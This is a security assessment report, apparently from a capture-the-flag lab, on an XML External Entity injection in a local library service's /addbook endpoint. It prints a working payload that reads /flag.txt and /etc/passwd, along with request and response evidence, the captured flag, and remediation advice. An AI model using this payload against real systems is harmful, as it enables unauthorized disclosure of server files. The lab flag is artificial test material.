# Security Assessment Report: Library Service XXE Injection

## TL;DR
- **Objective:** Add an ISBN to the library service and extract the flag from /flag.txt
- **Outcome:** ACHIEVED - XXE vulnerability successfully exploited to read arbitrary files
- **Highest-impact finding:** XML External Entity (XXE) Injection allowing arbitrary file disclosure
- **Validation status:** Flag extracted and confirmed, ISBN addition workflow completed

## Target Information
- **Target:** 127.0.0.1:32999
- **Host / base URL:** http://127.0.0.1:32999
- **Application or component:** Library Service (ISBN/book management)
- **Authentication context:** Not observed (unauthenticated access)
- **Relevant technology details:** XML parser with external entity processing enabled

## Confirmed Vulnerability
### XML External Entity (XXE) Injection
- **Affected endpoint / component:** POST /addbook
- **Impact:** Arbitrary file disclosure on the server filesystem, allowing extraction of sensitive files including /flag.txt and /etc/passwd
- **Preconditions:** 
  - Application accepts XML via form parameter 'xml'
  - XML parser processes external entities without protection
  - No input validation or entity restriction in place
- **Exact payload or PoC:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY file SYSTEM "file:///flag.txt">
]>
<Book>
<Title>APT1337</Title>
<ISBN>test</ISBN>
<Chapters>
<Chapter>
<Author>&file;</Author>
</Chapter>
</Chapters>
</Book>
```

## Steps to Reproduce
1. Send a POST request to `http://127.0.0.1:32999/addbook` with Content-Type `application/x-www-form-urlencoded`
2. Include the XXE payload in the `xml` form parameter, URL-encoded:
   - Define an external entity `<!ENTITY file SYSTEM "file:///flag.txt">`
   - Reference the entity with `&file;` in the `<Author>` field
3. Submit the request
4. Observe the server response containing the disclosed file content in the echoed XML structure

## Validation / Evidence
- **Validation token / flag:** `FLAG{686f5cc71bb19bc687346157854620abaca9b0c4b03394d226d3eea43fc85b0e}`
- **Tool evidence:** XXE vulnerability confirmed by successfully reading /etc/passwd first, then extracting flag from /flag.txt
- **Request evidence:**
```
POST /addbook HTTP/1.1
Host: 127.0.0.1:32999
Content-Type: application/x-www-form-urlencoded

xml=XXE payload with <!ENTITY file SYSTEM "file:///flag.txt"> and &file; in Author field
```
- **Response evidence:**
```html
<pre>You have append this book successfully !</pre>
<pre><Book>
<Title>APT1337</Title>
<ISBN>test</ISBN>
<Chapters>
<Chapter>
<Author>FLAG{686f5cc71bb19bc687346157854620abaca9b0c4b03394d226d3eea43fc85b0e}
</Author>
</Chapter>
</Chapters>
</Book></pre>
```
- **Notes on reliability / limitations:** 
  - Vulnerability is reliably exploitable
  - File paths must be accessible by the web server process
  - Both /etc/passwd and /flag.txt were successfully read
  - The book addition workflow completes successfully alongside file disclosure

## Remediation
- **Root cause:** The XML parser is configured to process external entities (DTD processing) without restrictions, allowing the attacker to define entities that reference local files on the server.
- **Recommended fix:**
  1. Disable external entity processing in the XML parser configuration
  2. Disable DTDs (DOCTYPE declarations) entirely if not required
  3. Use a less complex data format like JSON if XML features are not essential
  4. Implement input validation to reject XML containing DOCTYPE declarations
- **Defense-in-depth:**
  - Implement principle of least privilege for the web server process
  - Use chroot jails or containers to limit filesystem access
  - Enable WAF rules to detect and block XXE payloads
  - Monitor for suspicious XML patterns in application logs

## How to Verify the Fix
1. Submit the same XXE payload to the /addbook endpoint
2. **Expected secure result:** 
   - The XML parser should reject the request or ignore the external entity
   - The response should NOT contain the contents of /flag.txt or /etc/passwd
   - The entity reference `&file;` should either be stripped, cause an error, or be treated as literal text
   - No file disclosure should occur

## Remaining Leads
- **Confirmed blockers:** None
- **Unverified leads:** 
  - Potential for SSRF via external entity URLs (http://, ftp:// protocols)
  - Potential for denial of service via billion laughs or quadratic blowup attacks
  - Other endpoints may have similar XML parsing vulnerabilities
- **Missing context:** 
  - Exact XML parser library and version
  - Whether other file paths are accessible
  - Full server-side XML parser configuration
